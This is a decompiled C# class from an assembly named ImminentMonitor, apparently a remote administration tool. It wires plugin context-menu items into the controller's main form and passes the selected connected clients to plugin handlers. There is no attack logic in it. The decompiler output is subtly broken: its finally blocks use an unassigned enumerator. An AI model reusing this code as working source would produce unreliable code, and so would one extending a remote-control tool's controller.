// Decompiled with JetBrains decompiler
// Type: GClass36
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent.GUI;
using Imminent.IServerVars;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using System.Windows.Forms.Layout;

public sealed class GClass36 : IServerGUI
{
  public List<ToolStripMenuItem> list_0;
  public List<ToolStripMenuItem> list_1;
  public List<TabPage> list_2;

  public GClass36()
  {
    this.list_0 = new List<ToolStripMenuItem>();
    this.list_1 = new List<ToolStripMenuItem>();
    this.list_2 = new List<TabPage>();
  }

  public void AddContextItem(ContextItem contextItem_0)
  {
    GClass36.Class152 class152 = new GClass36.Class152();
    bool flag = false;
    class152.toolStripMenuItem_0 = this.method_2(class152.toolStripMenuItem_0, contextItem_0.Name);
    if (class152.toolStripMenuItem_0 == null)
      class152.toolStripMenuItem_0 = new ToolStripMenuItem();
    else
      flag = true;
    if (contextItem_0.Children != null)
    {
      foreach (ContextItem child in contextItem_0.Children)
      {
        ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem();
        toolStripMenuItem.Text = child.Name;
        toolStripMenuItem.Tag = (object) child;
        toolStripMenuItem.Name = "ChildFromPlugin";
        if (child.Icon != null)
          toolStripMenuItem.Image = child.Icon;
        toolStripMenuItem.Click += new EventHandler(this.method_0);
        this.list_1.Add(toolStripMenuItem);
        class152.toolStripMenuItem_0.DropDownItems.Add((ToolStripItem) toolStripMenuItem);
      }
    }
    class152.toolStripMenuItem_0.Text = contextItem_0.Name;
    class152.toolStripMenuItem_0.Name = contextItem_0.Name;
    class152.toolStripMenuItem_0.Tag = (object) contextItem_0;
    if (contextItem_0.Icon != null)
      class152.toolStripMenuItem_0.Image = contextItem_0.Icon;
    class152.toolStripMenuItem_0.Click += new EventHandler(this.method_0);
    if (!flag)
      Class97.formMain_0.Invoke((Delegate) new Delegate0(class152._Lambda\u0024__134));
    this.list_0.Add(class152.toolStripMenuItem_0);
  }

  private void method_0(object sender, EventArgs e)
  {
    ContextItem tag = (ContextItem) ((ToolStripItem) sender).Tag;
    IServerClient[] array = this.method_1().ToArray();
    if (tag.Children != null)
      return;
    tag.Clicked.Invoke(array);
  }

  public List<IServerClient> method_1()
  {
    List<IServerClient> iserverClientList = new List<IServerClient>();
    try
    {
      foreach (ListViewItem selectedItem in Class97.formMain_0.vmethod_0().vmethod_108().SelectedItems)
      {
        GClass18 gclass18 = Class97.gclass21_0.method_57(selectedItem.Name);
        if (gclass18 != null)
          iserverClientList.Add(gclass18.method_22());
        else
          break;
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    return iserverClientList;
  }

  public ToolStripMenuItem method_2(ToolStripMenuItem toolStripMenuItem_0, string string_0)
  {
    GClass36.Class151 class151 = new GClass36.Class151();
    class151.string_0 = string_0;
    class151.toolStripMenuItem_0 = toolStripMenuItem_0;
    Class97.formMain_0.vmethod_0().Invoke((Delegate) new Delegate0(class151._Lambda\u0024__135));
    return class151.toolStripMenuItem_0;
  }

  public void AddTabItem(TabItem tabItem_0)
  {
  }

  internal sealed class Class151
  {
    public ToolStripMenuItem toolStripMenuItem_0;
    public string string_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__135()
    {
      try
      {
        foreach (object obj in (ArrangedElementCollection) Class97.formMain_0.vmethod_0().vmethod_0().Items)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(obj);
          if (NewLateBinding.LateGet(objectValue, (System.Type) null, "Tag", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null) != (object) "SEPERATOR" && Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, "Text", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) this.string_0, false))
          {
            this.toolStripMenuItem_0 = (ToolStripMenuItem) objectValue;
            break;
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  internal sealed class Class152
  {
    public ToolStripMenuItem toolStripMenuItem_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__134() => Class97.formMain_0.vmethod_0().vmethod_0().Items.Add((ToolStripItem) this.toolStripMenuItem_0);
  }
}
